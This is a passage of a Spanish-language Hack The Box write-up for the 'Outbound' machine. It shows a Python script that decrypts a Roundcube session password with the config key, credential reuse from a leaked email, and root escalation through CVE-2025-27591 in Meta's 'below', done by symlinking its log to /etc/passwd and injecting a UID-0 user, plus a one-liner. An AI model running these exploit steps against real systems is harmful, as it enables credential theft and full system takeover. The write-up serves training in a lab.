ZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 rows in set (0.000 sec)
```

----

### Decrypt Roundcube Password (sessions var)

Al decodificar en base64 el registro de la sesión `6a5ktqih5uca6lj8vrmgh9v0oh` - identificamos las credenciales cifradas del usuario `jacob`: `password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";`.

```sh
❯ cat base64.txt | base64 -d; echo 
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```

Como indicamos anteriormente, no es la contraseña en texto plano, sino una versión cifrada que solo Roundcube puede utilizar con su clave de cifrado (que se encuentra en el archivo de configuración de Roundcube). Es por ello, que decidimos nuevamente revisar el archivo de configuración `config.inc.php` de Roundcube y filtrar por la palabra `key`.

En el resultado obtenido, comprobamos cual es el valor de la `des_key`, esta valor lo necesitaremos para intentar descifrar la contraseña encontrada en la tabla `sessions` del usuario `jacob`.

```sh
(remote) www-data@mail.outbound.htb:/var/www/html/roundcube/config$ cat config.inc.php | grep key
// This key is used to encrypt the users imap password which is stored
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

En nuestro equipo de atacante, creamos el siguiente script proporcionando la `key` obtenida del archivo de configuración y la contraseña cifrada para intentar descifrarla:

```python
from base64 import b64decode
from Crypto.Cipher import DES3

key = b'rcmail-!24ByteDESkey*Str'
encrypted_base64 = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/'

raw = b64decode(encrypted_base64)
iv = raw[:8]
ciphertext = raw[8:]

cipher = DES3.new(key, DES3.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)
decrypted = decrypted.rstrip(b'\x00')

print(f"[+] Contraseña descifrada: {decrypted.decode()}")
```

Al ejecutar el script, confirmamos que se ha descifrado exitosamente la contraseña del usuario `jacob`:

```sh
❯ python3 decrypt.py                                                                                      
[+] Contraseña descifrada: 595mO8DmwGeD
```

Desde el equipo `mail.outbound.htb` intentamos autenticarnos con las credenciales de `jacob`, obteniendo acceso exitosamente:

```sh
(remote) www-data@mail.outbound.htb:/var/www/html/roundcube/config$ su jacob
Password: 
jacob@mail:/var/www/html/roundcube/config$ 
```

----
## Shell as jacob
### Information Leakage
Al revisar el directorio personal del usuario (`/home/jacob`), encontramos su buzón de correo. Entre los mensajes recibidos, identificamos un correo enviado por `tyler@outbound.htb` que informa sobre cambios de credenciales debido a actualizaciones de políticas:

```sh
jacob@mail:~/mail/INBOX$ cat jacob 
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler
```

Con estas nuevas credenciales obtenidas del correo, intentamos acceder al servidor principal `outbound.htb` (no al servidor de correo), logrando autenticarnos exitosamente y localizando la flag `user.txt`:

```sh
❯ sshpass -p 'gY4Wr3a1evp4' ssh -o StrictHostKeyChecking=no jacob@$IP
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Nov 13 05:43:34 AM UTC 2025

  System load:  0.08              Processes:             252
  Usage of /:   74.7% of 6.73GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for eth0: 10.10.11.77
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Mon Jul 14 16:40:57 2025 from 10.10.14.77
jacob@outbound:~$ cat user.txt 
f32956*********************4df4d2
```

----

## Privilege Escalation
### Abusing sudoers privilege (CVE-2025-27591: Below Log Dir Symlink PrivEsc)

El siguiente objetivo es elevar nuestros privilegios para convertirnos en usuario `root` en el sistema. Al revisar los permisos de **sudoers** del usuario actual, encontramos lo siguiente:

- El usuario `jacob` puede ejecutar el binario `/usr/bin/below *` con cualquier argumento
- Sin embargo, tiene restricciones para ciertos argumentos: `--config*`, `--debug*` y `-d*`

> `Below` en Linux se refiere a una herramienta de monitorización de rendimiento de código abierto desarrollada por Meta que permite a los usuarios ver y registrar datos históricos del sistema, como el uso de CPU, memoria y E/S. Es una utilidad "que viaja en el tiempo", ya que permite reconstruir eventos pasados para el análisis post-mortem de problemas de rendimiento y tendencias de uso de recursos.
{: .prompt-info }

```sh
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

Para comprender mejor las capacidades del binario `below`, ejecutamos el comando con el parámetro `--help` para analizar sus funcionalidades disponibles.

```sh
jacob@outbound:~$ sudo /usr/bin/below --help
Usage: below [OPTIONS] [COMMAND]

Commands:
  live      Display live system data (interactive) (default)
  record    Record local system data (daemon mode)
  replay    Replay historical data (interactive)
  debug     Debugging facilities (for development use)
  dump      Dump historical data into parseable text format
  snapshot  Create a historical snapshot file for a given time range
  help      Print this message or the help of the given subcommand(s)

Options:
      --config <CONFIG>  [default: /etc/below/below.conf]
  -d, --debug            
  -h, --help             Print help
```

Realizando una búsqueda en Internet con el término `PrivEsc below`, identificamos una vulnerabilidad de escalada de privilegios reportada como `CVE-2025-27591`:

- [https://security.snyk.io/vuln/SNYK-RUST-BELOW-9397705](https://security.snyk.io/vuln/SNYK-RUST-BELOW-9397705)
- [https://github.com/obamalaolu/CVE-2025-27591](https://github.com/obamalaolu/CVE-2025-27591)
- [https://github.com/rvizx/CVE-2025-27591](https://github.com/rvizx/CVE-2025-27591)

> Las versiones afectadas de este paquete son vulnerables a la asignación incorrecta de permisos para recursos críticos debido a la creación de un directorio con permisos de escritura para todos los usuarios en `/var/log/below`. Esta configuración incorrecta permite a los usuarios locales sin privilegios realizar ataques de enlaces simbólicos, lo que podría manipular archivos críticos del sistema, como `/etc/shadow`, y provocar una escalada de privilegios de root.
{: .prompt-danger }

![image](/assets/img/writeups/htb-outbound/Outbound_6.png)

Confirmamos la existencia del directorio vulnerable con permisos excesivos:

```sh
jacob@outbound:~$ ls -l /var/log/ | grep below
drwxrwxrwx  3 root      root               4096 Jul 14 16:39 below
```

Para lograr la escalada de privilegios mediante el `CVE-2025-27591`, ejecutamos los siguientes comandos que aprovechan la configuración insegura del directorio `/var/log/below` con permisos excesivos. La estrategia consistió en crear un enlace simbólico desde el archivo de log `error_root.log` hacia `/etc/passwd`, de modo que cuando el binario `below` escribiera en sus logs, en realidad modificara el archivo de contraseñas del sistema. Insertamos una entrada de usuario maliciosa con UID 0 para obtener acceso root.

Finalmente logramos obtener la flag `root.txt`.

```sh
jacob@outbound:~$ HASH=$(openssl passwd -6 'Gzzcoo123')
jacob@outbound:~$ echo "gzzcoo:$HASH:0:0:root:/root:/bin/bash" > /tmp/payload
jacob@outbound:~$ rm -f /var/log/below/error_root.log
jacob@outbound:~$ ln -sf /etc/passwd /var/log/below/error_root.log
jacob@outbound:~$ sudo /usr/bin/below replay --time "invalid" >/dev/null 2>&1
jacob@outbound:~$ cat /tmp/payload > /var/log/below/error_root.log
jacob@outbound:~$ su gzzcoo
Password: 
gzzcoo@outbound:/home/jacob# id
uid=0(gzzcoo) gid=0(root) groups=0(root)
gzzcoo@outbound:/home/jacob# cat /root/root.txt 
7de49e********************847f97
```

También disponemos del siguiente `one-liner` para poder abusar de la vulnerabilidad y convertirnos en usuario `root`.

```sh
jacob@outbound:~$ u=root; rm -f /var/log/below/error_"$u".log; ln -s /etc/passwd /var/log/below/error_"$u".log; export LOGS_DIRECTORY=/var/log/below; sudo /usr/bin/below snapshot --begin now 2>/dev/null || true; echo 'pwn::0:0:root:/root:/bin/bash' >> /etc/passwd; su pwn
Snapshot has been created at snapshot_01763014138_01763014138.O9HxXZ
root@outbound:/home/jacob# whoami
root
```

> _Happy hacking :)_
